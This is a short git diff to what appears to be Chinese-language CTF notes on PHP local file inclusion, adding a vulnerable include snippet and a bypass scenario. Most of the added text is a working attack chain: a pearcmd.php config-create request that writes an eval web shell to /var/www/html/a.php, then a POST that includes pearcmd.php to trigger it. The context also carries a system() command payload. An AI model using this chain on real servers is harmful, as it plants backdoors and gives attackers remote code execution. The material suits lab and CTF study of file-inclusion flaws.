@@ -130,9 +130,25 @@ cmd=system("cat 36d.php");
 ```
 也可<https://www.cnblogs.com/Egcrying/p/17665041.html>
 
+^
+场景2：
+```
+function waf($path){
+    $path = str_replace(".","",$path);
+    return preg_match("/^[a-z]+/",$path);
+}
+
+if(waf($_POST[1])){
+    include "file://".$_POST[1];
+}
+```
 如果知道pearcmd.php路径
 ```
+GIT写木马
+/?+config-create+/<?=eval($_POST[2]);?>+/var/www/html/a.php 
 
+POST包含pearcmd.php
+1=localhost/usr/local/lib/php/pearcmd.php
 ```
 
 
